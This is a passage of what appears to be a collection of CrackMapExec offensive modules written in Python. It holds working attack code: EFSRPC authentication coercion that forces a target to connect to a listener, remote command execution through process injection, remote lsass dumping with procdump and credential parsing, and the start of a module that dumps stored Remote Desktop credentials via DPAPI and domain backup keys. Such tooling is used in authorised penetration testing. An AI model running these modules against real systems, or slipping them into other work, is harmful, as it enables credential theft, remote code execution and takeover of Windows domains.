(""Cert"", DWORD),\n        (""Users"", ENCRYPTION_CERTIFICATE_HASH),\n    )\n\n\nclass ENCRYPTED_FILE_METADATA_SIGNATURE(NDRSTRUCT):\n    structure = (\n        (""Type"", DWORD),\n        (""HASH"", ENCRYPTION_CERTIFICATE_HASH_LIST),\n        (""Certif"", ENCRYPTION_CERTIFICATE),\n        (""Blob"", EFS_RPC_BLOB),\n    )\n\n\nclass ENCRYPTION_CERTIFICATE_LIST(NDRSTRUCT):\n    align = 1\n    structure = ((""Data"", "":""),)\n\n\n################################################################################\n# RPC CALLS\n################################################################################\nclass EfsRpcOpenFileRaw(NDRCALL):\n    opnum = 0\n    structure = (\n        (""fileName"", WSTR),\n        (""Flag"", ULONG),\n    )\n\n\nclass EfsRpcOpenFileRawResponse(NDRCALL):\n    structure = (\n        (""hContext"", EXIMPORT_CONTEXT_HANDLE),\n        (""ErrorCode"", ULONG),\n    )\n\n\nclass EfsRpcEncryptFileSrv(NDRCALL):\n    opnum = 4\n    structure = ((""FileName"", WSTR),)\n\n\nclass EfsRpcEncryptFileSrvResponse(NDRCALL):\n    structure = ((""ErrorCode"", ULONG),)\n\n\ndef coerce(\n    username,\n    password,\n    domain,\n    lmhash,\n    nthash,\n    aesKey,\n    target,\n    pipe,\n    do_kerberos,\n    dc_host,\n    target_ip=None,\n    context=None,\n):\n    binding_params = {\n        ""lsarpc"": {\n            ""stringBinding"": r""ncacn_np:%s[\\PIPE\\lsarpc]"" % target,\n            ""MSRPC_UUID_EFSR"": (""c681d488-d850-11d0-8c52-00c04fd90f7e"", ""1.0""),\n        },\n        ""efsr"": {\n            ""stringBinding"": r""ncacn_np:%s[\\PIPE\\efsrpc]"" % target,\n            ""MSRPC_UUID_EFSR"": (""df1941c5-fe89-4e79-bf10-463657acf44d"", ""1.0""),\n        },\n        ""samr"": {\n            ""stringBinding"": r""ncacn_np:%s[\\PIPE\\samr]"" % target,\n            ""MSRPC_UUID_EFSR"": (""c681d488-d850-11d0-8c52-00c04fd90f7e"", ""1.0""),\n        },\n        ""lsass"": {\n            ""stringBinding"": r""ncacn_np:%s[\\PIPE\\lsass]"" % target,\n            ""MSRPC_UUID_EFSR"": (""c681d488-d850-11d0-8c52-00c04fd90f7e"", ""1.0""),\n        },\n        ""netlogon"": {\n            ""stringBinding"": r""ncacn_np:%s[\\PIPE\\netlogon]"" % target,\n            ""MSRPC_UUID_EFSR"": (""c681d488-d850-11d0-8c52-00c04fd90f7e"", ""1.0""),\n        },\n    }\n    rpc_transport = transport.DCERPCTransportFactory(binding_params[pipe][""stringBinding""])\n    if hasattr(rpc_transport, ""set_credentials""):\n        rpc_transport.set_credentials(\n            username=username,\n            password=password,\n            domain=domain,\n            lmhash=lmhash,\n            nthash=nthash,\n            aesKey=aesKey,\n        )\n\n    if target_ip:\n        rpc_transport.setRemoteHost(target_ip)\n\n    dce = rpc_transport.get_dce_rpc()\n    dce.set_auth_type(RPC_C_AUTHN_WINNT)\n    dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)\n\n    if do_kerberos:\n        rpc_transport.set_kerberos(do_kerberos, kdcHost=dc_host)\n        dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)\n\n    context.log.info(""[-] Connecting to %s"" % binding_params[pipe][""stringBinding""])\n    try:\n        dce.connect()\n    except Exception as e:\n        context.log.debug(""Something went wrong, check error status => %s"" % str(e))\n        sys.exit()\n    context.log.info(""[+] Connected!"")\n    context.log.info(""[+] Binding to %s"" % binding_params[pipe][""MSRPC_UUID_EFSR""][0])\n    try:\n        dce.bind(uuidtup_to_bin(binding_params[pipe][""MSRPC_UUID_EFSR""]))\n    except Exception as e:\n        context.log.debug(""Something went wrong, check error status => %s"" % str(e))\n        sys.exit()\n    context.log.info(""[+] Successfully bound!"")\n    return dce\n\n\ndef efs_rpc_open_file_raw(dce, listener, context=None):\n    try:\n        request = EfsRpcOpenFileRaw()\n        request[""fileName""] = ""\\\\\\\\%s\\\\test\\\\Settings.ini\\x00"" % listener\n        request[""Flag""] = 0\n        resp = dce.request(request)\n\n    except Exception as e:\n        if str(e).find(""ERROR_BAD_NETPATH"") >= 0:\n            context.log.info(""[+] Got expected ERROR_BAD_NETPATH exception!!"")\n            context.log.info(""[+] Attack worked!"")\n            return True\n        if str(e).find(""rpc_s_access_denied"") >= 0:\n            context.log.info(""[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!"")\n            context.log.info(""[+] OK! Using unpatched function!"")\n            context.log.info(""[-] Sending EfsRpcEncryptFileSrv!"")\n            try:\n                request = EfsRpcEncryptFileSrv()\n                request[""FileName""] = ""\\\\\\\\%s\\\\test\\\\Settings.ini\\x00"" % listener\n                resp = dce.request(request)\n            except Exception as e:\n                if str(e).find(""ERROR_BAD_NETPATH"") >= 0:\n                    context.log.info(""[+] Got expected ERROR_BAD_NETPATH exception!!"")\n                    context.log.info(""[+] Attack worked!"")\n                    return True\n                else:\n                    context.log.debug(""Something went wrong, check error status => %s"" % str(e))\n        else:\n            context.log.debug(""Something went wrong, check error status => %s"" % str(e))\n', 'pi.py': 'from base64 import b64decode\nfrom sys import exit\nfrom os import path\n\nclass CMEModule:\n\n    name = ""pi""\n    description = ""Run command as logged on users via Process Injection""\n    supported_protocols = [""smb""]\n    opsec_safe = True \n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        \'\'\'\n            PID       // Process ID for Target User, PID=pid\n            EXEC      // Command to exec, EXEC=\'command\'  Single quote is better to use\n\n            This module reads the executed command output under the name C:\\windows\\temp\\output.txt and deletes it. In case of a possible error, it may need to be deleted manually.\n        \'\'\'\n\n        self.tmp_dir = ""C:\\\\Windows\\\\Temp\\\\""\n        self.share = ""C$""\n        self.tmp_share = self.tmp_dir.split("":"")[1]\n        self.pi = ""pi.exe""\n        self.useembeded = True\n        self.pid = self.cmd = """"\n        self.pi_embedded = b64decode(\'\')\n    \n        if ""EXEC"" in module_options:\n            self.cmd = module_options[""EXEC""]\n\n        if ""PID"" in module_options:\n            self.pid = module_options[""PID""]\n\n    def on_admin_login(self, context, connection):\n\n        if self.useembeded:\n            file_to_upload = ""/tmp/pi.exe""\n            with open(file_to_upload, \'wb\') as pm:\n                pm.write(self.pi_embedded)\n        else:\n            if path.isfile(self.imp_exe):\n                file_to_upload = self.imp_exe\n            else:\n                context.log.error(f""Cannot open {self.imp_exe}"")\n                exit(1)\n    \n        try:\n            if self.cmd == """" or self.pid == """":\n                self.uploadfile = False\n                context.log.highlight(f""Firstly run tasklist.exe /v to find process id for each user"")\n                context.log.highlight(f""Usage: -o PID=pid EXEC=\'Command\'"")\n                return\n            else:\n                self.uploadfile = True\n                context.log.display(f""Uploading {self.pi}"")\n                with open(file_to_upload, \'rb\') as pi:\n                    try:\n                        connection.conn.putFile(self.share, f""{self.tmp_share}{self.pi}"", pi.read)\n                        context.log.success(f""pi.exe successfully uploaded"")\n                        \n                    except Exception as e:\n                        context.log.fail(f""Error writing file to share {self.tmp_share}: {e}"")\n                        return\n                                                                \n                context.log.display(f""Executing {self.cmd}"")\n                command = f\'{self.tmp_dir}pi.exe {self.pid} \\""{self.cmd}\\""\'\n                for line in connection.execute(command, True, methods=[""smbexec""]).splitlines():\n                    context.log.highlight(line)\n                                   \n        except Exception as e:\n            context.log.fail(f""Error running command: {e}"")\n        finally:\n            try:\n                if self.uploadfile == True:\n                    connection.conn.deleteFile(self.share, f""{self.tmp_share}{self.pi}"")\n                    context.log.success(f""pi.exe successfully deleted"")\n            except Exception as e:\n                context.log.fail(f""Error deleting pi.exe on {self.share}: {e}"")\n', 'printnightmare.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport sys\nfrom impacket import system_errors\nfrom impacket.dcerpc.v5.rpcrt import DCERPCException\nfrom impacket.structure import Structure\nfrom impacket.dcerpc.v5 import transport, rprn\nfrom impacket.dcerpc.v5.ndr import NDRCALL, NDRPOINTER, NDRSTRUCT, NDRUNION, NULL\nfrom impacket.dcerpc.v5.dtypes import DWORD, LPWSTR, ULONG, WSTR\nfrom impacket.dcerpc.v5.rprn import checkNullString, STRING_HANDLE, PBYTE_ARRAY\n\nKNOWN_PROTOCOLS = {\n    135: {""bindstr"": r""ncacn_ip_tcp:%s[135]""},\n    445: {""bindstr"": r""ncacn_np:%s[\\pipe\\epmapper]""},\n}\n\n\nclass CMEModule:\n    """"""\n    Check if vulnerable to printnightmare\n    Module by @mpgn_x64 based on https://github.com/ly4k/PrintNightmare\n    """"""\n\n    name = ""printnightmare""\n    description = ""Check if host vulnerable to printnightmare""\n    supported_protocols = [""smb""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def __init__(self, context=None, module_options=None):\n        self.context = context\n        self.module_options = module_options\n        self.__string_binding = None\n        self.port = None\n\n    def options(self, context, module_options):\n        """"""\n        PORT    Port to check (defaults to 445)\n        """"""\n        self.port = 445\n        if ""PORT"" in module_options:\n            self.port = int(module_options[""PORT""])\n\n    def on_login(self, context, connection):\n        # Connect and bind to MS-RPRN (https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/848b8334-134a-4d02-aea4-03b673d6c515)\n        stringbinding = r""ncacn_np:%s[\\PIPE\\spoolss]"" % connection.host\n\n        context.log.info(""Binding to %s"" % (repr(stringbinding)))\n\n        rpctransport = transport.DCERPCTransportFactory(stringbinding)\n\n        rpctransport.set_credentials(\n            connection.username,\n            connection.password,\n            connection.domain,\n            connection.lmhash,\n            connection.nthash,\n            connection.aesKey,\n        )\n\n        rpctransport.set_kerberos(connection.kerberos, kdcHost=connection.kdcHost)\n\n        rpctransport.setRemoteHost(connection.host)\n        rpctransport.set_dport(self.port)\n\n        try:\n            dce = rpctransport.get_dce_rpc()\n            # Connect to spoolss named pipe\n            dce.connect()\n            # Bind to MSRPC MS-RPRN UUID: 12345678-1234-ABCD-EF00-0123456789AB\n            dce.bind(rprn.MSRPC_UUID_RPRN)\n        except Exception as e:\n            context.log.fail(""Failed to bind: %s"" % e)\n            sys.exit(1)\n\n        flags = APD_COPY_ALL_FILES | APD_COPY_FROM_DIRECTORY | APD_INSTALL_WARNED_DRIVER\n\n        driver_container = DRIVER_CONTAINER()\n        driver_container[""Level""] = 2\n        driver_container[""DriverInfo""][""tag""] = 2\n        driver_container[""DriverInfo""][""Level2""][""cVersion""] = 0\n        driver_container[""DriverInfo""][""Level2""][""pName""] = NULL\n        driver_container[""DriverInfo""][""Level2""][""pEnvironment""] = NULL\n        driver_container[""DriverInfo""][""Level2""][""pDriverPath""] = NULL\n        driver_container[""DriverInfo""][""Level2""][""pDataFile""] = NULL\n        driver_container[""DriverInfo""][""Level2""][""pConfigFile""] = NULL\n        driver_container[""DriverInfo""][""Level2""][""pConfigFile""] = NULL\n\n        try:\n            hRpcAddPrinterDriverEx(\n                dce,\n                pName=NULL,\n                pDriverContainer=driver_container,\n                dwFileCopyFlags=flags,\n            )\n        except DCERPCSessionError as e:\n            # RPC_E_ACCESS_DENIED is returned on patched systems, when\n            # a non-administrative user tries to create a new printer\n            # driver\n            if e.error_code == RPC_E_ACCESS_DENIED:\n                context.log.info(""Not vulnerable :\'("")\n                return False\n            # If vulnerable, \'ERROR_INVALID_PARAMETER\' will be returned\n            if e.error_code == system_errors.ERROR_INVALID_PARAMETER:\n                context.log.highlight(""Vulnerable, next step https://github.com/ly4k/PrintNightmare"")\n                return True\n            raise e\n        context.log.highlight(""Vulnerable, next step https://github.com/ly4k/PrintNightmare"")\n        return True\n\n\nclass DCERPCSessionError(DCERPCException):\n    def __init__(self, error_string=None, error_code=None, packet=None):\n        DCERPCException.__init__(self, error_string, error_code, packet)\n\n    def __str__(self):\n        key = self.error_code\n        if key in system_errors.ERROR_MESSAGES:\n            error_msg_short = system_errors.ERROR_MESSAGES[key][0]\n            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]\n            return ""RPRN SessionError: code: 0x%x - %s - %s"" % (\n                self.error_code,\n                error_msg_short,\n                error_msg_verbose,\n            )\n        else:\n            return ""RPRN SessionError: unknown error code: 0x%x"" % self.error_code\n\n\n################################################################################\n# CONSTANTS\n################################################################################\n# MS-RPRN - 3.1.4.4.8\nAPD_COPY_ALL_FILES = 0x00000004\nAPD_COPY_FROM_DIRECTORY = 0x00000010\nAPD_INSTALL_WARNED_DRIVER = 0x00008000\n\n# MS-RPRN - 3.1.4.4.7\nDPD_DELETE_UNUSED_FILES = 0x00000001\n\n# https://docs.microsoft.com/en-us/windows/win32/com/com-error-codes-3\nRPC_E_ACCESS_DENIED = 0x8001011B\nsystem_errors.ERROR_MESSAGES[RPC_E_ACCESS_DENIED] = (\n    ""RPC_E_ACCESS_DENIED"",\n    ""Access is denied."",\n)\n\n\n################################################################################\n# STRUCTURES\n################################################################################\n# MS-RPRN - 2.2.1.5.1\nclass DRIVER_INFO_1(NDRSTRUCT):\n    structure = ((""pName"", STRING_HANDLE),)\n\n\nclass PDRIVER_INFO_1(NDRPOINTER):\n    referent = ((""Data"", DRIVER_INFO_1),)\n\n\n# MS-RPRN - 2.2.1.5.2\nclass DRIVER_INFO_2(NDRSTRUCT):\n    structure = (\n        (""cVersion"", DWORD),\n        (""pName"", LPWSTR),\n        (""pEnvironment"", LPWSTR),\n        (""pDriverPath"", LPWSTR),\n        (""pDataFile"", LPWSTR),\n        (""pConfigFile"", LPWSTR),\n    )\n\n\nclass PDRIVER_INFO_2(NDRPOINTER):\n    referent = ((""Data"", DRIVER_INFO_2),)\n\n\nclass DRIVER_INFO_2_BLOB(Structure):\n    structure = (\n        (""cVersion"", ""<L""),\n        (""NameOffset"", ""<L""),\n        (""EnvironmentOffset"", ""<L""),\n        (""DriverPathOffset"", ""<L""),\n        (""DataFileOffset"", ""<L""),\n        (""ConfigFileOffset"", ""<L""),\n    )\n\n    def __init__(self, data=None):\n        Structure.__init__(self, data=data)\n\n    def fromString(self, data, offset=0):\n        Structure.fromString(self, data)\n\n        name = data[self[""NameOffset""] + offset :].decode(""utf-16-le"")\n        name_len = name.find(""\\0"")\n        self[""Name""] = checkNullString(name[:name_len])\n\n        self[""ConfigFile""] = data[self[""ConfigFileOffset""] + offset : self[""DataFileOffset""] + offset].decode(""utf-16-le"")\n        self[""DataFile""] = data[self[""DataFileOffset""] + offset : self[""DriverPathOffset""] + offset].decode(""utf-16-le"")\n        self[""DriverPath""] = data[self[""DriverPathOffset""] + offset : self[""EnvironmentOffset""] + offset].decode(""utf-16-le"")\n        self[""Environment""] = data[self[""EnvironmentOffset""] + offset : self[""NameOffset""] + offset].decode(""utf-16-le"")\n\n\nclass DRIVER_INFO_2_ARRAY(Structure):\n    def __init__(self, data=None, pcReturned=None):\n        Structure.__init__(self, data=data)\n        self[""drivers""] = list()\n        remaining = data\n        if data is not None:\n            for _ in range(pcReturned):\n                attr = DRIVER_INFO_2_BLOB(remaining)\n                self[""drivers""].append(attr)\n                remaining = remaining[len(attr) :]\n\n\nclass DRIVER_INFO_UNION(NDRUNION):\n    commonHdr = ((""tag"", ULONG),)\n    union = {1: (""pNotUsed"", PDRIVER_INFO_1), 2: (""Level2"", PDRIVER_INFO_2)}\n\n\n# MS-RPRN - 3.1.4.1.8.3\nclass DRIVER_CONTAINER(NDRSTRUCT):\n    structure = ((""Level"", DWORD), (""DriverInfo"", DRIVER_INFO_UNION))\n\n\n################################################################################\n# RPC CALLS\n################################################################################\n# MS-RPRN - 3.1.4.4.2\nclass RpcEnumPrinterDrivers(NDRCALL):\n    opnum = 10\n    structure = (\n        (""pName"", STRING_HANDLE),\n        (""pEnvironment"", LPWSTR),\n        (""Level"", DWORD),\n        (""pDrivers"", PBYTE_ARRAY),\n        (""cbBuf"", DWORD),\n    )\n\n\nclass RpcEnumPrinterDriversResponse(NDRCALL):\n    structure = (\n        (""pDrivers"", PBYTE_ARRAY),\n        (""pcbNeeded"", DWORD),\n        (""pcReturned"", DWORD),\n        (""ErrorCode"", ULONG),\n    )\n\n\n# MS-RPRN - 3.1.4.4.8\nclass RpcAddPrinterDriverEx(NDRCALL):\n    opnum = 89\n    structure = (\n        (""pName"", STRING_HANDLE),\n        (""pDriverContainer"", DRIVER_CONTAINER),\n        (""dwFileCopyFlags"", DWORD),\n    )\n\n\nclass RpcAddPrinterDriverExResponse(NDRCALL):\n    structure = ((""ErrorCode"", ULONG),)\n\n\n# MS-RPRN - 3.1.4.4.7\nclass RpcDeletePrinterDriverEx(NDRCALL):\n    opnum = 84\n    structure = (\n        (""pName"", STRING_HANDLE),\n        (""pEnvironment"", WSTR),\n        (""pDriverName"", WSTR),\n        (""dwDeleteFlag"", DWORD),\n        (""dwVersionNum"", DWORD),\n    )\n\n\nclass RpcDeletePrinterDriverExResponse(NDRCALL):\n    structure = ((""ErrorCode"", ULONG),)\n\n\n################################################################################\n# OPNUMs and their corresponding structures\n################################################################################\nOPNUMS = {\n    10: (RpcEnumPrinterDrivers, RpcEnumPrinterDriversResponse),\n    84: (RpcDeletePrinterDriverEx, RpcDeletePrinterDriverExResponse),\n    89: (RpcAddPrinterDriverEx, RpcAddPrinterDriverExResponse),\n}\n\n\n################################################################################\n# HELPER FUNCTIONS\n################################################################################\ndef hRpcAddPrinterDriverEx(dce, pName, pDriverContainer, dwFileCopyFlags):\n    request = RpcAddPrinterDriverEx()\n\n    request[""pName""] = checkNullString(pName)\n    request[""pDriverContainer""] = pDriverContainer\n    request[""dwFileCopyFlags""] = dwFileCopyFlags\n\n    return dce.request(request)\n', 'procdump.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# prdocdump module for CME python3\n# author: github.com/mpgn\n# thanks to pixis (@HackAndDo) for making it pretty l33t :)\n# v0.4\n\nimport base64\nimport re\nimport sys\n\nfrom pypykatz.pypykatz import pypykatz\n\nfrom cme.helpers.bloodhound import add_user_bh\n\n\nclass CMEModule:\n    name = ""procdump""\n    description = ""Get lsass dump using procdump64 and parse the result with pypykatz""\n    supported_protocols = [""smb""]\n    opsec_safe = True  # not really\n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        """"""\n        TMP_DIR             Path where process dump should be saved on target system (default: C:\\\\Windows\\\\Temp\\\\)\n        PROCDUMP_PATH       Path where procdump.exe is on your system (default: /tmp/), if changed embeded version will not be used\n        PROCDUMP_EXE_NAME   Name of the procdump executable (default: procdump.exe), if changed embeded version will not be used\n        DIR_RESULT          Location where the dmp are stored (default: DIR_RESULT = PROCDUMP_PATH)\n        """"""\n\n        self.tmp_dir = ""C:\\\\Windows\\\\Temp\\\\""\n        self.share = ""C$""\n        self.tmp_share = self.tmp_dir.split("":"")[1]\n        self.procdump_embeded = base64.b64decode(\n            """"\n        )\n        self.procdump = ""procdump.exe""\n        self.procdump_path = ""/tmp/""\n        self.dir_result = self.procdump_path\n        self.useembeded = True\n\n        if ""PROCDUMP_PATH"" in module_options:\n            self.procdump_path = module_options[""PROCDUMP_PATH""]\n            self.useembeded = False\n\n        if ""PROCDUMP_EXE_NAME"" in module_options:\n            self.procdump = module_options[""PROCDUMP_EXE_NAME""]\n            self.useembeded = False\n\n        if ""TMP_DIR"" in module_options:\n            self.tmp_dir = module_options[""TMP_DIR""]\n\n        if ""DIR_RESULT"" in module_options:\n            self.dir_result = module_options[""DIR_RESULT""]\n\n    def on_admin_login(self, context, connection):\n        if self.useembeded == True:\n            with open(self.procdump_path + self.procdump, ""wb"") as procdump:\n                procdump.write(self.procdump_embeded)\n\n        context.log.display(""Copy {} to {}"".format(self.procdump_path + self.procdump, self.tmp_dir))\n        with open(self.procdump_path + self.procdump, ""rb"") as procdump:\n            try:\n                connection.conn.putFile(self.share, self.tmp_share + self.procdump, procdump.read)\n                context.log.success(""Created file {} on the \\\\\\\\{}{}"".format(self.procdump, self.share, self.tmp_share))\n            except Exception as e:\n                context.log.fail(f""Error writing file to share {self.share}: {e}"")\n\n        # get pid lsass\n        command = \'tasklist /v /fo csv | findstr /i ""lsass""\'\n        context.log.display(""Getting lsass PID {}"".format(command))\n        p = connection.execute(command, True)\n        pid = p.split("","")[1][1:-1]\n        command = self.tmp_dir + self.procdump + "" -accepteula -ma "" + pid + "" "" + self.tmp_dir + ""%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.dmp""\n        context.log.display(""Executing command {}"".format(command))\n        p = connection.execute(command, True)\n        context.log.debug(p)\n        dump = False\n        if ""Dump 1 complete"" in p:\n            context.log.success(""Process lsass.exe was successfully dumped"")\n            dump = True\n        else:\n            context.log.fail(""Process lsass.exe error un dump, try with verbose"")\n\n        if dump:\n            regex = r""([A-Za-z0-9-]*.dmp)""\n            matches = re.search(regex, str(p), re.MULTILINE)\n            machine_name = """"\n            if matches:\n                machine_name = matches.group()\n            else:\n                context.log.display(""Error getting the lsass.dmp file name"")\n                sys.exit(1)\n\n            context.log.display(""Copy {} to host"".format(machine_name))\n\n            with open(self.dir_result + machine_name, ""wb+"") as dump_file:\n                try:\n                    connection.conn.getFile(self.share, self.tmp_share + machine_name, dump_file.write)\n                    context.log.success(""Dumpfile of lsass.exe was transferred to {}"".format(self.dir_result + machine_name))\n                except Exception as e:\n                    context.log.fail(""Error while get file: {}"".format(e))\n\n            try:\n                connection.conn.deleteFile(self.share, self.tmp_share + self.procdump)\n                context.log.success(""Deleted procdump file on the {} share"".format(self.share))\n            except Exception as e:\n                context.log.fail(""Error deleting procdump file on share {}: {}"".format(self.share, e))\n\n            try:\n                connection.conn.deleteFile(self.share, self.tmp_share + machine_name)\n                context.log.success(""Deleted lsass.dmp file on the {} share"".format(self.share))\n            except Exception as e:\n                context.log.fail(""Error deleting lsass.dmp file on share {}: {}"".format(self.share, e))\n\n            with open(self.dir_result + machine_name, ""rb"") as dump:\n                try:\n                    credentials = []\n                    credz_bh = []\n                    try:\n                        pypy_parse = pypykatz.parse_minidump_external(dump)\n                    except Exception as e:\n                        pypy_parse = None\n                        context.log.fail(f""Error parsing minidump: {e}"")\n\n                    ssps = [\n                        ""msv_creds"",\n                        ""wdigest_creds"",\n                        ""ssp_creds"",\n                        ""livessp_creds"",\n                        ""kerberos_creds"",\n                        ""credman_creds"",\n                        ""tspkg_creds"",\n                    ]\n                    for luid in pypy_parse.logon_sessions:\n                        for ssp in ssps:\n                            for cred in getattr(pypy_parse.logon_sessions[luid], ssp, []):\n                                domain = getattr(cred, ""domainname"", None)\n                                username = getattr(cred, ""username"", None)\n                                password = getattr(cred, ""password"", None)\n                                NThash = getattr(cred, ""NThash"", None)\n                                if NThash is not None:\n                                    NThash = NThash.hex()\n                                if username and (password or NThash) and ""$"" not in username:\n                                    print_pass = password if password else NThash\n                                    context.log.highlight(domain + ""\\\\"" + username + "":"" + print_pass)\n                                    if ""."" not in domain and domain.upper() in connection.domain.upper():\n                                        domain = connection.domain\n                                        credz_bh.append(\n                                            {\n                                                ""username"": username.upper(),\n                                                ""domain"": domain.upper(),\n                                            }\n                                        )\n                    if len(credz_bh) > 0:\n                        add_user_bh(credz_bh, None, context.log, connection.config)\n                except Exception as e:\n                    context.log.fail(""Error openning dump file"", str(e))\n', 'pso.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom impacket.ldap import ldapasn1 as ldapasn1_impacket\nfrom impacket.ldap import ldap as ldap_impacket\nfrom math import fabs\nimport re\n\n\nclass CMEModule:\n    \'\'\'\n        Created by fplazar and wanetty\n        Module by @gm_eduard and @ferranplaza \n        Based on: https://github.com/juliourena/CrackMapExec/blob/master/cme/modules/get_description.py\n    \'\'\'\n\n    name = \'pso\'\n    description = ""Query to get PSO from LDAP""\n    supported_protocols = [\'ldap\']\n    opsec_safe = True\n    multiple_hosts = True\n    \n    pso_fields = [\n        ""cn"",\n        ""msDS-PasswordReversibleEncryptionEnabled"",\n        ""msDS-PasswordSettingsPrecedence"",\n        ""msDS-MinimumPasswordLength"",\n        ""msDS-PasswordHistoryLength"",\n        ""msDS-PasswordComplexityEnabled"",\n        ""msDS-LockoutObservationWindow"",\n        ""msDS-LockoutDuration"",\n        ""msDS-LockoutThreshold"",\n        ""msDS-MinimumPasswordAge"",\n        ""msDS-MaximumPasswordAge"",\n        ""msDS-PSOAppliesTo"",\n    ]\n\n    def options(self, context, module_options):\n        \'\'\'\n        No options available.\n        \'\'\'\n        pass\n    \n    def convert_time_field(self, field, value):\n        time_fields = {\n            ""msDS-LockoutObservationWindow"": (60, ""mins""),\n            ""msDS-MinimumPasswordAge"": (86400, ""days""),\n            ""msDS-MaximumPasswordAge"": (86400, ""days""),\n            ""msDS-LockoutDuration"": (60, ""mins"")\n        }\n\n        if field in time_fields.keys():\n            value = f""{int((fabs(float(value)) / (10000000 * time_fields[field][0])))} {time_fields[field][1]}""\n        \n        return value\n    \n    def on_login(self, context, connection):\n        \'\'\'Concurrent. Required if on_admin_login is not present. This gets called on each authenticated connection\'\'\'\n        # Building the search filter\n        searchFilter = ""(objectClass=msDS-PasswordSettings)""\n\n        try:\n            context.log.debug(\'Search Filter=%s\' % searchFilter)\n            resp = connection.ldapConnection.search(searchFilter=searchFilter,\n                                                    attributes=self.pso_fields,\n                                                    sizeLimit=0)\n        except ldap_impacket.LDAPSearchError as e:\n            if e.getErrorString().find(\'sizeLimitExceeded\') >= 0:\n                context.log.debug(\'sizeLimitExceeded exception caught, giving up and processing the data received\')\n                # We reached the sizeLimit, process the answers we have already and that\'s it. Until we implement\n                # paged queries\n                resp = e.getAnswers()\n                pass\n            else:\n                logging.debug(e)\n                return False\n\n        pso_list = []\n\n        context.log.debug(\'Total of records returned %d\' % len(resp))\n        for item in resp:\n            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:\n                continue\n\n            pso_info = {}\n\n            try:\n                for attribute in item[\'attributes\']:\n                    attr_name = str(attribute[\'type\'])\n                    if attr_name in self.pso_fields:\n                        pso_info[attr_name] = attribute[\'vals\'][0]._value.decode(\'utf-8\')\n\n                pso_list.append(pso_info)\n\n            except Exception as e:\n                context.log.debug(""Exception:"", exc_info=True)\n                context.log.debug(\'Skipping item, cannot process due to error %s\' % str(e))\n                pass\n        if len(pso_list) > 0:\n            context.log.success(\'Password Settings Objects (PSO) found:\')\n            for pso in pso_list:\n                for field in self.pso_fields:\n                    if field in pso:\n                        value = self.convert_time_field(field, pso[field])\n                        context.log.highlight(u\'{}: {}\'.format(field, value))\n                context.log.highlight(\'-----\')\n\n        else:\n            context.log.info(\'No Password Settings Objects (PSO) found.\')\n', 'rdcman.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom dploot.triage.rdg import RDGTriage\nfrom dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file\nfrom dploot.triage.backupkey import BackupkeyTriage\nfrom dploot.lib.target import Target\nfrom dploot.lib.smb import DPLootSMBConnection\n\nfrom cme.helpers.logger import highlight\n\n\nclass CMEModule:\n    name = ""rdcman""\n    description = ""Remotely dump Remote Desktop Connection Manager (sysinternals) credentials""\n    supported_protocols = [""smb""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        """"""\n        PVK             Domain backup key file\n        MKFILE          File with masterkeys in form of {GUID}:SHA1\n        """"""\n        self.pvkbytes = None\n        self.masterkeys = None\n\n        if ""PVK"" in module_options:\n            self.pvkbytes = open(module_options[""PVK""], ""rb"").read()\n\n        if ""MKFILE"" in module_options:\n            self.masterkeys = parse_masterkey_file(module_options[""MKFILE""])\n            self.pvkbytes = open(module_options[""MKFILE""], ""rb"").read()\n\n    def on_admin_login(self, context, connection):\n        host = connection.hostname + ""."" + connection.domain\n        domain = connection.domain\n        username = connection.username\n        kerberos = connection.kerberos\n        aesKey = connection.aesKey\n        use_kcache = getattr(connection, ""use_kcache"", False)\n        password = getattr(connection, ""password"", """")\n        lmhash = getattr(connection, ""lmhash"", """")\n        nthash = getattr(connection, ""nthash"", """")\n\n        if self.pvkbytes is None:\n            try:\n                dc = Target.create(\n                    domain=domain,\n                    username=username,\n                    password=password,\n                    target=domain,\n                    lmhash=lmhash,\n                    nthash=nthash,\n                    do_kerberos=kerberos,\n                    aesKey=aesKey,\n                    no_pass=True,\n                    use_kcache=use_kcache,\n                )\n\n                dc_conn = DPLootSMBConnection(dc)\n                dc_conn.connect()\n\n                if dc_conn.is_admin:\n                    context.log.success(""User is Domain Administrator, exporting domain backupkey..."")\n                    backupkey_triage = BackupkeyTriage(target=dc, conn=dc_conn)\n                    backupkey = backupkey_triage.triage_backupkey()\n                    self.pvkbytes = backupkey.backupkey_v2\n            except Exception as e:\n                context.log.debug(""Could not get domain backupkey: {}"".format(e))\n                pass\n\n        target = Target.create(\n            domain=domain,\n            username=username,\n            password=password,\n            target=host,\n            lmhash=lmhash,\n            nthash=nthash,\n            do_kerberos=kerberos,\n            aesKey=aesKey,\n            no_pass=True,\n            use_kcache=use_kcache,\n        )\n\n        conn = None\n\n        try:\n            conn = DPLootSMBConnection(target)\n            conn.smb_session = connection.conn\n        except Exception as e:\n            context.log.debug(""Could not upgrade connection: {}"".format(e))\n            return\n\n        plaintexts = {username: password for _, _, username, password, _, _ in context.db.get_credentials(cred_type=""plaintext"")}\n        nthashes = {username: nt.split("":"")[1] if "":"" in nt else nt for _, _, username, nt, _, _ in context.db.get_credentials(cred_type=""hash"")}\n        if password != """":\n            plaintexts[username] = password\n        if nthash != """":\n            nthashes[username] = nthash\n\n        if self.masterkeys is None:\n            try:\n                masterkeys_triage = MasterkeysTriage(\n                    target=target,\n                    conn=conn,\n                    pvkbytes=self.pvkbytes,\n                    passwords=plaintexts,\n                    nthashes=nthashes,\n                )\n                self.masterkeys = masterkeys_triage.triage_masterkeys()\n            except Exception as e:\n                context.log.debug(""Could not get masterkeys: {}"".format(e))\n\n        if len(self.masterkeys) == 0:\n            context.log.fail(""No masterkeys 